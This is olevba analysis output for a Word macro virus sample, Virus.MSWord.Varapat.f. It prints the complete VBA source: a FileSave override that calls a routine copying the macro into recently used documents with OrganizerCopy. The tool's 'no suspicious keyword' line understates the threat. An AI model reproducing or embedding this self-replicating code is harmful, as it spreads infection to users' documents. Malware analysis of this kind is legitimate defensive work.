olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.f
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Varapat.f 
in file: Virus.MSWord.Varapat.f - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
On Error Resume Next
For s = 2 To 9
Application.OrganizerCopy ActiveDocument.FullName, _
RecentFiles(s).Path & "\" & RecentFiles(s).Name, "N", 3
Next s
End Sub
Sub FileSave()
ToolsMacro
End Sub
'Nitema II, Pativara/Nestor, 2005'

No suspicious keyword or IOC found.

